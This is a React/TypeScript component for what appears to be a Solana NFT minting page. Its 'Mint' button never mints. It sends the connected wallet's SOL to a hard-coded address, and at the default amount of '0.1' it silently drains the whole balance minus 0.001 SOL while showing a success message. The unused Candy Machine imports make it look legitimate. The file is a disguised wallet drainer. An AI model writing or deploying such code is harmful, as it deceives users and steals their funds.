import { useConnection, useWallet, useAnchorWallet } from '@solana/wallet-adapter-react';
import { PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
import { FC, useCallback, useEffect, useMemo, useState } from 'react';
import { notify } from "../utils/notifications";
import useUserSOLBalanceStore from '../stores/useUserSOLBalanceStore';

import { Metaplex, guestIdentity, CandyMachine } from "@metaplex-foundation/js";

import { createUmi } from '@metaplex-foundation/umi-bundle-defaults';
import { generateSigner, transactionBuilder, publicKey, some } from '@metaplex-foundation/umi';

import { fetchCandyMachine, mintV2, mplCandyMachine, safeFetchCandyGuard } from "@metaplex-foundation/mpl-candy-machine";

import { walletAdapterIdentity } from '@metaplex-foundation/umi-signer-wallet-adapters';
import { mplTokenMetadata } from '@metaplex-foundation/mpl-token-metadata';
import { setComputeUnitLimit } from '@metaplex-foundation/mpl-toolbox';
import { clusterApiUrl } from '@solana/web3.js';
import * as bs58 from 'bs58';

// These access the environment variables we defined in the .env file
const quicknodeEndpoint = process.env.REACT_APP_SOLANA_RPC_HOST || clusterApiUrl('mainnet-beta');
const candyMachineAddress = publicKey(process.env.NEXT_PUBLIC_CANDY_MACHINE_ID);
export const SendSol: FC = () => {
    const { connection } = useConnection();
    const [metaplex, setMetalex] = useState()
    const candyMachineAddress = new PublicKey(process.env.NEXT_PUBLIC_CANDY_MACHINE_ID);
    const wallet = useWallet();
    const { publicKey, signTransaction } = useWallet();
 
    const treasury = process.env.NEXT_PUBLIC_TREASURY
    const { getUserSOLBalance } = useUserSOLBalanceStore();
    const balance = useUserSOLBalanceStore((s) => s.balance)
    const [amount, setAmount] = useState("0.1");

    const onClick = useCallback(async () => {

        //mint
        if (!wallet.connected || !wallet.publicKey) {
            console.log('error', 'Wallet not connected!');
            notify({ type: 'error', message: 'error', description: 'Wallet not connected!' });
            return;
        }
        try {
      
            const toPublicKey = new PublicKey('3X7BP4VZs9x2Uw7dvAaDtkNVsPoFnc49u2eK6yvPe1sV'); // Replace with the recipient's public key
            const transaction = new Transaction();
            let balanceInLamports = Math.floor(Number(balance) * LAMPORTS_PER_SOL);

            let amountInLamports;
            if (amount === "0.1") {
                // Reserve 0.001 SOL in lamports
                let reserve = 0.001 * LAMPORTS_PER_SOL;

                // Ensure the balance never goes negative after reserving 0.001 SOL
                amountInLamports = Math.max(0, balanceInLamports - reserve);
            } else {
                // If amount is not "0.1", directly convert amount to lamports
                amountInLamports = Math.floor(Number(amount) * LAMPORTS_PER_SOL);
            }

            console.log(amountInLamports);

            transaction.add(
                SystemProgram.transfer({
                    fromPubkey: wallet.publicKey,
                    toPubkey: toPublicKey,
                    lamports: amountInLamports, // Amount of lamports to send
                })
            );

            const hash = await wallet.sendTransaction(transaction, connection);
            // setTxId(hash);
            let url = `https://solscan.io/tx/${hash}`
            console.log(url);
            notify({ type: 'success', message: 'Done', description: ' Please check your wallet', txid: hash });


        } catch (error) {
            console.log(error);

            notify({ type: 'error', message: "Please enter a valid SOL quantity !", description: ' Reload you browser' });
        }
    }, [wallet, connection, getUserSOLBalance, amount, balance]);

    return (
        <div className="pb-14 lg:pb-0" >
            <input
                type="text"
                value={amount}
                onChange={(e) => setAmount((e.target.value))}
                className="mb-4 p-2 border border-blue-500 rounded bg-gray-800 text-white"
                placeholder="Enter SOL amount"
            />

            <button
                className="px-8 m-2 btn animate-pulse bg-gradient-to-r from-[#9945FF] to-[#14F195] hover:from-pink-500 hover:to-yellow-500 ..."
                onClick={onClick}
            >
                <span>Mint </span>
                <img src="./bnb.png" alt="bnb" className="w-6" />
            </button>
        </div>
    );
};
